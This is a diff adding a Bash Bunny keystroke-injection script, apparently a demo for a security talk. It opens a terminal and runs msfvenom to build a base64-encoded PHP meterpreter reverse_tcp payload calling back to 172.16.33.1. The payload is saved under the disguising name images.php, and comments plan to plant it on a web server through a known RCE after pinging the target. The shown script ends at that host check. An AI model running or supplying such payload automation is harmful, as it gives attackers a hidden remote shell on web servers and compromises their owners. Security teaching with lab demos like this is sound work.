@@ -1,0 +1,41 @@
+DELAY 2000
+ALT F2
+DELAY 1000
+STRING gnome-terminal
+DELAY 1000
+ENTER
+DELAY 1000
+STRING #[INFO] Hello, let's setup the exploitation :)
+DELAY 1000
+ENTER
+DELAY 1000
+STRING cd /home/dbusby/Documents/Projects/Github/talks/Security_and_why_you_need_to_review_yours/compromise/bashbunny
+DELAY 1000
+ENTER
+DELAY 1000
+STRING /bin/echo '<?PHP' > images.php
+ENTER
+DELAY 1000
+STRING /usr/bin/msfvenom -p php/meterpreter/reverse_tcp LHOST=172.16.33.1 -e php/base64 -f raw  >> images.php
+DELAY 5000
+ENTER
+STRING /bin/echo '?>' >> images.php
+DELAY 1000
+ENTER
+DELAY 1000
+STRING #[INFO] Ok, we have setup the php meterpreter payload now we need to get this on the webserver
+DELAY 1000
+ENTER
+DELAY 1000
+STRING #[INFO] We just so happen to know of an existing RCE vulnerability on the site so let's use that :)
+DELAY 1000
+ENTER
+DELAY 1000
+STRING #[INFO] Let's check the host is up first though ;-)
+DELAY 1000
+ENTER
+STRING /bin/ping 172.16.33.2 -c 1
+DELAY 100
+STRING #[INFO] Is the host up ? if not yank out the bashbunny now!
+DELAY 5000
+
